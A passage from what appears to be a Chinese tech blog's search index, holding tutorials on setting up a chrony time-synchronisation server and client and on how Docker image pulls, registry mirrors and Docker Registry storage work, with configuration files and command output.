目录&#x2F;sys 解析</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1694844\">Centos 网卡命名规范及信息查看</a></li>\n<li><a href=\"https://www.cnblogs.com/jackydalong/archive/2013/11/06/3410890.html\">biosdevname网卡命名方式</a></li>\n<li><a href=\"https://www.jianshu.com/p/5d5560e9e26a\">CentOS 7 下网络管理之命令行工具nmcli</a></li>\n<li><a href=\"https://linux.cn/article-6629-1.html\">从 NetworkManager 切换到 Systemd-networkd</a></li>\n<li><a href=\"https://github.com/canonical/netplan\">Netplan Github 主页</a></li>\n</ul>\n"},{"title":"Chrony时间同步服务器的安装记录","url":"/2023/09/03/Chrony%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>与 ntp 相比，chrony 是一种相对较新的时间同步工具，具有以下特点：</p>\n<ul>\n<li>采用一种称为”时间滤波”的技术，通过估计时钟漂移率，平滑时钟跳变和抖动，来提高时钟同步的精度和稳定性</li>\n<li>支持本地时钟缓存，在没有网络连接时依然保持时钟的精度，还支持快速时钟校准和实时时钟补偿等功能</li>\n<li>系统资源的消耗相对较少，配置相对简单更加易于管理</li>\n</ul>\n<p>Chrony 有两个核心组件：</p>\n<ul>\n<li><code>chronyd</code>：守护进程，主要用于调整内核中运行的系统时间和时间服务器同步</li>\n<li><code>chronyc</code>：客户端，它提供一个用户界面，用于监控性能并进行多样化的配置</li>\n</ul>\n<h2 id=\"二、服务器的配置方法\"><a href=\"#二、服务器的配置方法\" class=\"headerlink\" title=\"二、服务器的配置方法\"></a>二、服务器的配置方法</h2><h3 id=\"1-安装方法\"><a href=\"#1-安装方法\" class=\"headerlink\" title=\"1. 安装方法\"></a>1. 安装方法</h3><p>CentOS 8 默认使用 chronyd 作为时间同步工具, openEuler 也将其作为默认启动的系统服务。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install chrony</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-配置文件\"><a href=\"#2-配置文件\" class=\"headerlink\" title=\"2. 配置文件\"></a>2. 配置文件</h3><p>chrony 的配置文件位于：<code>/etc/chrony.conf</code>，作为服务器时，最核心的配置参数有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 配置公网的上游时间服务资源池</span><br><span class=\"line\">pool ntp.aliyun.com iburst</span><br><span class=\"line\"></span><br><span class=\"line\"># 记录系统时钟获取/失去时间的速率</span><br><span class=\"line\">driftfile /var/lib/chrony/drift</span><br><span class=\"line\"></span><br><span class=\"line\"># 如果系统时钟的偏差大于1秒，则允许在前三次更新中进行 步进调整</span><br><span class=\"line\">makestep 1.0 3</span><br><span class=\"line\"></span><br><span class=\"line\"># 启用内核对实时时钟（RTC）的同步</span><br><span class=\"line\">rtcsync</span><br><span class=\"line\"></span><br><span class=\"line\"># 允许来自本地网络 192.168.0.0/24 的NTP客户端访问</span><br><span class=\"line\">allow 192.168.0.0/24</span><br><span class=\"line\"></span><br><span class=\"line\"># 即使未与时间源同步，也提供时间服务</span><br><span class=\"line\">local stratum 10</span><br><span class=\"line\"></span><br><span class=\"line\"># 从系统 tz 数据库获取 TAI-UTC 偏移量和闰秒。</span><br><span class=\"line\">leapsectz right/UTC</span><br><span class=\"line\"></span><br><span class=\"line\"># 指定日志文件的目录。</span><br><span class=\"line\">logdir /var/log/chrony</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>pool hostname [option] &amp; server hostname [option]<br>  用于指定要同步的 NTP 服务器。<br>  pool 是一组资源池，例如： 0.centos.pool.ntp.org、pool.ntp.org<br>  server 是单个时间服务器：ntp1.aliyun.com</p>\n<p>  iburst 是参数, 一般用此参数即可。该参数的含义是在头四次 NTP 请求以 2s 或者更短的间隔，而不是以 minpoll x 指定的最小间隔，这样的设置可以让 chronyd 启动时快速进行一次同步<br>  其他的参数有 minpoll x 默认值是 6，代表 64s。maxpoll x 默认值是 9，代表 512s</p>\n</li>\n<li><p>driftfile file<br>  Chrony 会根据实际时间计算修正值，并将补偿参数记录在该指令指定的文件里，默认为<code>/var/lib/chrony/drift</code>。</p>\n</li>\n<li><p>makestep threshold limit<br>  此指令使 Chrony 根据需要通过加速或减慢时钟来逐渐校正任何时间偏移。例如：<code>makestep 1.0 3</code>，就表示当头三次校时，如果时间相差 1.0s, 则跳跃式校时</p>\n</li>\n<li><p>rtcsync<br>  启用内核时间与 RTC 时间同步 (自动写回硬件)</p>\n</li>\n<li><p>allow ip<br>  设置允许客户端访问的 IP 地址段，默认是<code>192.168.0.0/16</code></p>\n</li>\n<li><p>local stratum 10<br>  即使未与时间源同步，也提供时间服务</p>\n</li>\n<li><p>leapsectz right&#x2F;UTC<br>  允许从系统 tz 数据库获取 TAI-UTC 偏移量和闰秒。</p>\n</li>\n<li><p>logdir file<br>  该参数用于指定 Chrony 日志文件的路径</p>\n</li>\n</ul>\n<h3 id=\"3-启动方式\"><a href=\"#3-启动方式\" class=\"headerlink\" title=\"3. 启动方式\"></a>3. 启动方式</h3><p>设置系统自动启动，注意 firewall 可能影响服务端口</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl <span class=\"built_in\">enable</span> --now chronyd</span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> --now firewalld</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、客户端的配置方法\"><a href=\"#三、客户端的配置方法\" class=\"headerlink\" title=\"三、客户端的配置方法\"></a>三、客户端的配置方法</h2><h3 id=\"1-配置文件\"><a href=\"#1-配置文件\" class=\"headerlink\" title=\"1. 配置文件\"></a>1. 配置文件</h3><p>修改默认配置文件<code>/etc/chrony.conf</code>，其实只要修改<code>server</code>配置就行，其他都是默认：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">server 192.168.0.140 iburst</span><br><span class=\"line\"></span><br><span class=\"line\"># Record the rate at which the system clock gains/losses time.</span><br><span class=\"line\">driftfile /var/lib/chrony/drift</span><br><span class=\"line\"></span><br><span class=\"line\"># Allow the system clock to be stepped in the first three updates</span><br><span class=\"line\"># if its offset is larger than 1 second.</span><br><span class=\"line\">makestep 1.0 3</span><br><span class=\"line\"></span><br><span class=\"line\"># Enable kernel synchronization of the real-time clock (RTC).</span><br><span class=\"line\">rtcsync</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-启动方式\"><a href=\"#2-启动方式\" class=\"headerlink\" title=\"2. 启动方式\"></a>2. 启动方式</h3><p>完事后，重启系统服务</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl restart chronyd</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、运行状态检查\"><a href=\"#四、运行状态检查\" class=\"headerlink\" title=\"四、运行状态检查\"></a>四、运行状态检查</h2><h3 id=\"1-网络端口占用-UDP-123-323\"><a href=\"#1-网络端口占用-UDP-123-323\" class=\"headerlink\" title=\"1. 网络端口占用 - UDP 123 &amp; 323\"></a>1. 网络端口占用 - UDP 123 &amp; 323</h3><p>chronyd 服务器启动后，通过 UDP 123 对外提供服务，同时 UDP 323 作为 chronyd 的控制端口。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]# netstat -tunpl |grep chronyd</span><br><span class=\"line\">udp        0      0 127.0.0.1:323           0.0.0.0:*                           1159/chronyd        </span><br><span class=\"line\">udp        0      0 0.0.0.0:123             0.0.0.0:*                           1159/chronyd        </span><br><span class=\"line\">udp6       0      0 ::1:323                 :::*                                1159/chronyd  </span><br></pre></td></tr></table></figure>\n\n<p>相应的，作为客户端时就只能看到 UDP 323 的控制端口。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@Copy-of-VM-Centos7 etc]# netstat -tunpl |grep chronyd</span><br><span class=\"line\">udp        0      0 127.0.0.1:323           0.0.0.0:*                           1333/chronyd        </span><br><span class=\"line\">udp6       0      0 ::1:323                 :::*                                1333/chronyd </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-查看时间同步状态-chronyc-tracking\"><a href=\"#2-查看时间同步状态-chronyc-tracking\" class=\"headerlink\" title=\"2. 查看时间同步状态 - chronyc tracking\"></a>2. 查看时间同步状态 - <code>chronyc tracking</code></h3><figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">Reference ID    : C0A8008C (192.168.0.140)</span><br><span class=\"line\">Stratum         : 3</span><br><span class=\"line\">Ref time (UTC)  : Sun Sep 03 13:55:23 2023</span><br><span class=\"line\">System time     : 0.000034211 seconds fast of NTP time</span><br><span class=\"line\">Last offset     : +0.000040019 seconds</span><br><span class=\"line\">RMS offset      : 0.001916519 seconds</span><br><span class=\"line\">Frequency       : 7.131 ppm fast</span><br><span class=\"line\">Residual freq   : +0.341 ppm</span><br><span class=\"line\">Skew            : 5.028 ppm</span><br><span class=\"line\">Root delay      : 0.019536793 seconds</span><br><span class=\"line\">Root dispersion : 0.002344563 seconds</span><br><span class=\"line\">Update interval : 65.1 seconds</span><br><span class=\"line\">Leap status     : Normal</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-查看时间服务器列表：-chronyc-sources-v\"><a href=\"#3-查看时间服务器列表：-chronyc-sources-v\" class=\"headerlink\" title=\"3. 查看时间服务器列表： chronyc sources -v\"></a>3. 查看时间服务器列表： <code>chronyc sources -v</code></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">210 Number of sources = 1</span><br><span class=\"line\"></span><br><span class=\"line\">  .-- Source mode  &#x27;^&#x27; = server, &#x27;=&#x27; = peer, &#x27;#&#x27; = local clock.</span><br><span class=\"line\"> / .- Source state &#x27;*&#x27; = current synced, &#x27;+&#x27; = combined , &#x27;-&#x27; = not combined,</span><br><span class=\"line\">| /   &#x27;?&#x27; = unreachable, &#x27;x&#x27; = time may be in error, &#x27;~&#x27; = time too variable.</span><br><span class=\"line\">||                                                 .- xxxx [ yyyy ] +/- zzzz</span><br><span class=\"line\">||      Reachability register (octal) -.           |  xxxx = adjusted offset,</span><br><span class=\"line\">||      Log2(Polling interval) --.      |          |  yyyy = measured offset,</span><br><span class=\"line\">||                                \\     |          |  zzzz = estimated error.</span><br><span class=\"line\">||                                 |    |           \\</span><br><span class=\"line\">MS Name/IP address         Stratum Poll Reach LastRx Last sample               </span><br><span class=\"line\">===============================================================================</span><br><span class=\"line\">^* 192.168.0.140                 2   6    17     3  -1348ns[  +19us] +/-   12ms</span><br></pre></td></tr></table></figure>\n\n\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://www.jianshu.com/p/e9be333aa54c\">时间同步 chrony 的服务端和客户端配置</a></li>\n<li><a href=\"https://cloud.tencent.com/developer/article/1546322\">再见 NTP，是时候拥抱下一代时间同步服务 Chrony 了</a></li>\n</ul>\n"},{"title":"Docker Mirror 容器镜像服务解析","url":"/2021/01/31/Docker-Mirror-%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E6%9C%8D%E5%8A%A1%E8%A7%A3%E6%9E%90/","content":"<p>在实际生产环境下，机器都不能访问外部互联网，或者访问互联网络的带宽有限，同时有大量的容器镜像需要从外部下载，如果每次开发、测试、部署时都需要从互联网下载容器镜像，则将占用大量的带宽而且效率较低。同时，在某些场景如物联网场景中，需要使用移动网络接入互联网，这时带宽可能是系统部署的瓶颈。</p>\n<p>更为严重的问题是，Docker Hub公有云容器镜像服务对客户端有限流设置，当镜像拉取操作达到一定流量时，会导致服务无法使用。Docker Hub最新免费服务条款（11月1日生效），匿名用户每6小时只允许拉取100次，登录用户200次，只有付费用户不受此限制。</p>\n<p>Mirror代理缓存仓库的作用就是为了以上问题，通过运行一个缓存仓库允许你在本地储存镜像，减少过多的通过互联网从<code>Docker Hub</code>拉取镜像，这个特性对于一些在他们环境中拥有数量庞大的Docker引擎的用户来说很有用。</p>\n<h2 id=\"image命名规则\"><a href=\"#image命名规则\" class=\"headerlink\" title=\"image命名规则\"></a>image命名规则</h2><p>容器镜像（iamge）的命名规则是：<code>myregistrydomain:port/foo/bar</code>，其中包含了几个关键信息：HUB域名或IP地址、端口号、仓库名、软件名、标记名。<br>例如，命令<code>docker pull harbor.caogo.local:80/library/mongo:3.6</code>的含义是：从<code>harbor.caogo.local</code>服务器，通过http端口，获取liblary仓库的mongo软件镜像，标签为3.6</p>\n<p><code>docker.io</code>是Docker的官方HUB，其中<code>/library</code>是官方仓库所在位置，而<code>/calico</code>等则是开发者在官方HUB的自定义仓库。因此，Docker规定官方镜像可以采用省略所有前缀的简写方式，即：<br><code>docker pull docker.io/library/ubuntu</code> &#x3D;&#x3D; <code>docker pull ubuntu</code></p>\n<p>常用的镜像仓库HUB包括：</p>\n<ul>\n<li><code>registry-1.docker.io</code>                    Docker官方镜像</li>\n<li><code>k8s.gcr.io</code>                              Google Kubernetes系统镜像</li>\n<li><code>quay.io</code>                                 重要的第三方镜像</li>\n<li><code>registry.cn-hangzhou.aliyuncs.com</code>       阿里云的系统镜像</li>\n</ul>\n<h2 id=\"docker-pull-镜像拉取流程\"><a href=\"#docker-pull-镜像拉取流程\" class=\"headerlink\" title=\"docker pull 镜像拉取流程\"></a>docker pull 镜像拉取流程</h2><p>根据<a href=\"https://docs.docker.com/registry/spec/api/#pulling-an-image\">Pulling An Image 官方文档</a>的解释：</p>\n<blockquote>\n<p>An “image” is a combination of a JSON manifest and individual layer files.</p>\n</blockquote>\n<p>一个镜像image包含了以下要素：</p>\n<ul>\n<li>名称 name：The name of the image.</li>\n<li>标记 tag：The tag for this version of the image.</li>\n<li>分层文件 fsLayers：A list of layer descriptors (including digest)</li>\n<li>签名 signature：A JWS used to verify the manifest content</li>\n</ul>\n<blockquote>\n<p>image已经建立了行业标准 - OCI(Open Container Initiative)镜像规范，确保Docker、Podman等不同容器产品之间共享image，可以参见附录继续研究</p>\n</blockquote>\n<p>docker pull的过程很复杂，包括鉴权、校验，下载、合并镜像层，解压缩等等，但最核心的是两个步骤：</p>\n<ol>\n<li>发送请求 <code>GET /v2/&lt;name&gt;/manifests/&lt;reference&gt;</code> ，获取镜像的mainfest清单文件<br> reference可以是标记tag，或摘要digest。</li>\n<li>发送请求 <code>GET /v2/&lt;name&gt;/blobs/&lt;digest&gt;</code> ，获取镜像层文件</li>\n</ol>\n<p>通过<code>curl -X GET http://localhost:5000/v2/alpine/manifests/3.6</code>，获取镜像的manifest清单文件，其格式为</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;schemaVersion&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;alpine&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;tag&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;3.6&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;architecture&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;amd64&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;fsLayers&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;blobSum&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;blobSum&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;sha256:5a3ea8efae5d0abb93d2a04be0a4870087042b8ecab8001f613cdc2a9440616a&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">   <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;history&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;v1Compatibility&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;&#123;\\&quot;architecture\\&quot;:\\&quot;amd64\\&quot;,\\&quot;config\\&quot;:&#123;\\&quot;Hostname\\&quot;:\\&quot;\\&quot;,\\&quot;Domainname\\&quot;:\\&quot;\\&quot;,\\&quot;User\\&quot;:\\&quot;\\&quot;,\\&quot;AttachStdin\\&quot;:false,\\&quot;AttachStdout\\&quot;:false,\\&quot;AttachStderr\\&quot;:false,\\&quot;Tty\\&quot;:false,\\&quot;OpenStdin\\&quot;:false,\\&quot;StdinOnce\\&quot;:false,\\&quot;Env\\&quot;:[\\&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\&quot;],\\&quot;Cmd\\&quot;:[\\&quot;/bin/sh\\&quot;],\\&quot;ArgsEscaped\\&quot;:true,\\&quot;Image\\&quot;:\\&quot;sha256:143f9315f5a85306192ccffd37fbfa65db21f67aaa938c2538bd50f52123a12f\\&quot;,\\&quot;Volumes\\&quot;:null,\\&quot;WorkingDir\\&quot;:\\&quot;\\&quot;,\\&quot;Entrypoint\\&quot;:null,\\&quot;OnBuild\\&quot;:null,\\&quot;Labels\\&quot;:null&#125;,\\&quot;container\\&quot;:\\&quot;fd086f4b9352674c6a1ae4d02051f95a4e0a55cda943c5780483938dedfb2d8f\\&quot;,\\&quot;container_config\\&quot;:&#123;\\&quot;Hostname\\&quot;:\\&quot;fd086f4b9352\\&quot;,\\&quot;Domainname\\&quot;:\\&quot;\\&quot;,\\&quot;User\\&quot;:\\&quot;\\&quot;,\\&quot;AttachStdin\\&quot;:false,\\&quot;AttachStdout\\&quot;:false,\\&quot;AttachStderr\\&quot;:false,\\&quot;Tty\\&quot;:false,\\&quot;OpenStdin\\&quot;:false,\\&quot;StdinOnce\\&quot;:false,\\&quot;Env\\&quot;:[\\&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\&quot;],\\&quot;Cmd\\&quot;:[\\&quot;/bin/sh\\&quot;,\\&quot;-c\\&quot;,\\&quot;#(nop) \\&quot;,\\&quot;CMD [\\\\\\&quot;/bin/sh\\\\\\&quot;]\\&quot;],\\&quot;ArgsEscaped\\&quot;:true,\\&quot;Image\\&quot;:\\&quot;sha256:143f9315f5a85306192ccffd37fbfa65db21f67aaa938c2538bd50f52123a12f\\&quot;,\\&quot;Volumes\\&quot;:null,\\&quot;WorkingDir\\&quot;:\\&quot;\\&quot;,\\&quot;Entrypoint\\&quot;:null,\\&quot;OnBuild\\&quot;:null,\\&quot;Labels\\&quot;:&#123;&#125;&#125;,\\&quot;created\\&quot;:\\&quot;2019-03-07T22:20:00.563496859Z\\&quot;,\\&quot;docker_version\\&quot;:\\&quot;18.06.1-ce\\&quot;,\\&quot;id\\&quot;:\\&quot;baaf9c1caf4fb211f173d053029997dcfade0644ac354c8a068e4ebf23fcf1c5\\&quot;,\\&quot;os\\&quot;:\\&quot;linux\\&quot;,\\&quot;parent\\&quot;:\\&quot;5d8f720b0ab2b92a29a7e338aa90cad32dac2bf6518c7aae5844aab896ee36ec\\&quot;,\\&quot;throwaway\\&quot;:true&#125;&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;v1Compatibility&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;&#123;\\&quot;id\\&quot;:\\&quot;5d8f720b0ab2b92a29a7e338aa90cad32dac2bf6518c7aae5844aab896ee36ec\\&quot;,\\&quot;created\\&quot;:\\&quot;2019-03-07T22:20:00.434038891Z\\&quot;,\\&quot;container_config\\&quot;:&#123;\\&quot;Cmd\\&quot;:[\\&quot;/bin/sh -c #(nop) ADD file:9714761bb81de664e431dec41f12db20f0438047615df2ecd9fdc88933d6c20f in / \\&quot;]&#125;&#125;&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">   <span class=\"punctuation\">]</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">   <span class=\"attr\">&quot;signatures&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">[</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;header&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;jwk&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">               <span class=\"attr\">&quot;crv&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;P-256&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">               <span class=\"attr\">&quot;kid&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;KMUD:PVGZ:P2LO:LC7C:JSZZ:DCUO:FB3A:VXIA:U7UM:WVMY:7KJT:5TPS&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">               <span class=\"attr\">&quot;kty&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;EC&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">               <span class=\"attr\">&quot;x&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;M5uDyG_04QhZKJx2FFku4t2UUWeYYeyg0-LhmrNf5OQ&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">               <span class=\"attr\">&quot;y&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;TdXi_yetmEqWSEKqTudnjb7tn5m-AVQmxGeknXVL8w8&quot;</span></span><br><span class=\"line\">            <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">            <span class=\"attr\">&quot;alg&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;ES256&quot;</span></span><br><span class=\"line\">         <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;signature&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;xSwT9ePqDKjDm3i9AHkgFxnZGO6TdVIePcl6XxTvrCPSjOx_Xd1jf8YgouhXWDffBygicwp8DDnxJ7bB30puuw&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">         <span class=\"attr\">&quot;protected&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;eyJmb3JtYXRMZW5ndGgiOjIxMzAsImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyMS0wMS0zMVQxMzo1NjoxNFoifQ&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">   <span class=\"punctuation\">]</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Docker-Registry-镜像注册服务\"><a href=\"#Docker-Registry-镜像注册服务\" class=\"headerlink\" title=\"Docker Registry 镜像注册服务\"></a>Docker Registry 镜像注册服务</h2><p>Registry是Docker提供的镜像注册服务，其设计目标是一套存储和分发镜像的处理机制，实现方式是在Docker引擎中运行一个来自<code>docker.io/library/registry</code>的实例。</p>\n<p>需要注意的是，Registry管理镜像是基于文件系统的,数据存储目录位于实例所在容器的<code>/var/lib/registry</code></p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">~ # tree /var/lib/registry</span><br><span class=\"line\">/var/lib/registry</span><br><span class=\"line\">└── docker</span><br><span class=\"line\">    └── registry</span><br><span class=\"line\">        └── v2</span><br><span class=\"line\">            ├── blobs</span><br><span class=\"line\">            │   └── sha256</span><br><span class=\"line\">            │       ├── 36</span><br><span class=\"line\">            │       │   └── 36c3a913e62f77a82582eb7ce30d255f805c3d1e11d58e1f805e14d33c2bc5a5</span><br><span class=\"line\">            │       │       └── data</span><br><span class=\"line\">            │       ├── 43</span><br><span class=\"line\">            │       │   └── 43773d1dba76c4d537b494a8454558a41729b92aa2ad0feb23521c3e58cd0440</span><br><span class=\"line\">            │       │       └── data</span><br><span class=\"line\">            │       ├── 5a</span><br><span class=\"line\">            │       │   └── 5a3ea8efae5d0abb93d2a04be0a4870087042b8ecab8001f613cdc2a9440616a</span><br><span class=\"line\">            │       │       └── data</span><br><span class=\"line\">            │       └── a3</span><br><span class=\"line\">            │           └── a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4</span><br><span class=\"line\">            │               └── data</span><br><span class=\"line\">            └── repositories</span><br><span class=\"line\">                ├── alpine</span><br><span class=\"line\">                │   ├── _layers</span><br><span class=\"line\">                │   │   └── sha256</span><br><span class=\"line\">                │   │       ├── 43773d1dba76c4d537b494a8454558a41729b92aa2ad0feb23521c3e58cd0440</span><br><span class=\"line\">                │   │       │   └── link</span><br><span class=\"line\">                │   │       ├── 5a3ea8efae5d0abb93d2a04be0a4870087042b8ecab8001f613cdc2a9440616a</span><br><span class=\"line\">                │   │       │   └── link</span><br><span class=\"line\">                │   │       └── a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4</span><br><span class=\"line\">                │   │           └── link</span><br><span class=\"line\">                │   ├── _manifests</span><br><span class=\"line\">                │   │   ├── revisions</span><br><span class=\"line\">                │   │   │   └── sha256</span><br><span class=\"line\">                │   │   │       └── 36c3a913e62f77a82582eb7ce30d255f805c3d1e11d58e1f805e14d33c2bc5a5</span><br><span class=\"line\">                │   │   │           └── link</span><br><span class=\"line\">                │   │   └── tags</span><br><span class=\"line\">                │   │       └── 3.6</span><br><span class=\"line\">                │   │           ├── current</span><br><span class=\"line\">                │   │           │   └── link</span><br><span class=\"line\">                │   │           └── index</span><br><span class=\"line\">                │   │               └── sha256</span><br><span class=\"line\">                │   │                   └── 36c3a913e62f77a82582eb7ce30d255f805c3d1e11d58e1f805e14d33c2bc5a5</span><br><span class=\"line\">                │   │                       └── link</span><br><span class=\"line\">                │   └── _uploads</span><br><span class=\"line\">                └── myregistry</span><br><span class=\"line\">                    ├── _layers</span><br><span class=\"line\">                    │   └── sha256</span><br><span class=\"line\">                    │       ├── 43773d1dba76c4d537b494a8454558a41729b92aa2ad0feb23521c3e58cd0440</span><br><span class=\"line\">                    │       │   └── link</span><br><span class=\"line\">                    │       ├── 5a3ea8efae5d0abb93d2a04be0a4870087042b8ecab8001f613cdc2a9440616a</span><br><span class=\"line\">                    │       │   └── link</span><br><span class=\"line\">                    │       └── a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4</span><br><span class=\"line\">                    │           └── link</span><br><span class=\"line\">                    ├── _manifests</span><br><span class=\"line\">                    │   ├── revisions</span><br><span class=\"line\">                    │   │   └── sha256</span><br><span class=\"line\">                    │   │       └── 36c3a913e62f77a82582eb7ce30d255f805c3d1e11d58e1f805e14d33c2bc5a5</span><br><span class=\"line\">                    │   │           └── link</span><br><span class=\"line\">                    │   └── tags</span><br><span class=\"line\">                    │       └── latest</span><br><span class=\"line\">                    │           ├── current</span><br><span class=\"line\">                    │           │   └── link</span><br><span class=\"line\">                    │           └── index</span><br><span class=\"line\">                    │               └── sha256</span><br><span class=\"line\">                    │                   └── 36c3a913e62f77a82582eb7ce30d255f805c3d1e11d58e1f805e14d33c2bc5a5</span><br><span class=\"line\">                    │                       └── link</span><br><span class=\"line\">                    └── _uploads</span><br><span class=\"line\"></span><br><span class=\"line\">48 directories, 16 files</span><br></pre></td></tr></table></figure>\n\n<p>Registry的默认配置文件，位于实例所在容器的<code>/etc/docker/registry/config.yml</code>，默认基本内容是：<br>全量配置信息请见<a href=\"https://docs.docker.com/registry/configuration/#list-of-configuration-options\">config.yml</a></p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">~ # cat /etc/docker/registry/config.yml</span><br><span class=\"line\">version: 0.1</span><br><span class=\"line\">log:</span><br><span class=\"line\">  fields:</span><br><span class=\"line\">    service: registry</span><br><span class=\"line\">storage:</span><br><span class=\"line\">  cache:</span><br><span class=\"line\">    blobdescriptor: inmemory</span><br><span class=\"line\">  filesystem:</span><br><span class=\"line\">    rootdirectory: /var/lib/registry</span><br><span class=\"line\">http:</span><br><span class=\"line\">  addr: :5000</span><br><span class=\"line\">  headers:</span><br><span class=\"line\">    X-Content-Type-Options: [nosniff]</span><br><span class=\"line\">health:</span><br><span class=\"line\">  storagedriver:</span><br><span class=\"line\">    enabled: true</span><br><span class=\"line\">    interval: 10s</span><br><span class=\"line\">    threshold: 3</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>Docker提供的标准镜像服务称为<code>registry</code>，当前版本是由go语言开发的v2（之前python开发的registry v1在网上已被标为废弃，最后版本是v1.6）, 新版 registry 